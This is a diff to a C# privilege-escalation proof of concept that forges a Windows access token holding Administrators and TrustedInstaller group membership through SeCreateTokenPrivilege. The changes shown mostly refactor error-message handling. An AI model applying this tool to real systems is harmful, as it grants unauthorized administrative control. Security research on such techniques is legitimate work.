@@ -420,16 +420,18 @@ namespace SeCreateTokenPrivilegePoC
         static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
-        static string GetWin32ErrorMessage(int code)
+        static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
             uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
             uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
             StringBuilder message = new StringBuilder(255);
+            IntPtr pNtdll = IntPtr.Zero;
 
-            IntPtr pNtdll = LoadLibrary("ntdll.dll");
+            if (isNtStatus)
+                pNtdll = LoadLibrary("ntdll.dll");
 
             uint status = FormatMessage(
-                FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM,
+                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
                 pNtdll,
                 code,
                 0,
@@ -437,7 +439,8 @@ namespace SeCreateTokenPrivilegePoC
                 255,
                 IntPtr.Zero);
 
-            FreeLibrary(pNtdll);
+            if (isNtStatus)
+                FreeLibrary(pNtdll);
 
             if (status == 0)
             {
@@ -451,8 +454,10 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
+
         static IntPtr CreatePrivilegedToken()
         {
+            int error;
             LUID authId;
             int MajorVersion = 0;
             int MinorVersion = 0;
@@ -482,8 +487,9 @@ namespace SeCreateTokenPrivilegePoC
 
             if (!AllocateLocallyUniqueId(out LUID luid))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to allocate LUID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
@@ -496,8 +502,9 @@ namespace SeCreateTokenPrivilegePoC
 
             if (!ConvertStringSidToSid(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Administrator group SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
@@ -505,8 +512,9 @@ namespace SeCreateTokenPrivilegePoC
                 "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
                 out IntPtr pTrustedInstaller))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Trusted Installer SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
@@ -604,15 +612,17 @@ namespace SeCreateTokenPrivilegePoC
             if (ntstatus != STATUS_SUCCESS)
             {
                 Console.WriteLine("[-] Failed to create privileged token.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                 return IntPtr.Zero;
             }
 
             return hToken;
         }
 
+
         static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
         {
+            int error;
             var luid = new LUID();
             int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
             IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);
@@ -632,8 +642,9 @@ namespace SeCreateTokenPrivilegePoC
             {
                 if (!LookupPrivilegeValue(IntPtr.Zero, privs[idx], ref luid))
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to lookup {0}.");
-                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                     return false;
                 }
 
@@ -643,6 +654,7 @@ namespace SeCreateTokenPrivilegePoC
 
             return true;
         }
+
 
         static IntPtr GetInformationFromToken(
             IntPtr hToken,
@@ -672,6 +684,7 @@ namespace SeCreateTokenPrivilegePoC
 
             return buffer;
         }
+
 
         static bool GetCurrentUserSid(out IntPtr pSid)
         {
@@ -722,6 +735,7 @@ namespace SeCreateTokenPrivilegePoC
             return status;
         }
 
+
         static void ZeroMemory(IntPtr buffer, int size)
         {
             byte[] nullBytes = new byte[size];
@@ -731,6 +745,7 @@ namespace SeCreateTokenPrivilegePoC
 
             Marshal.Copy(nullBytes, 0, buffer, size);
         }
+
 
         static void Main()
         {
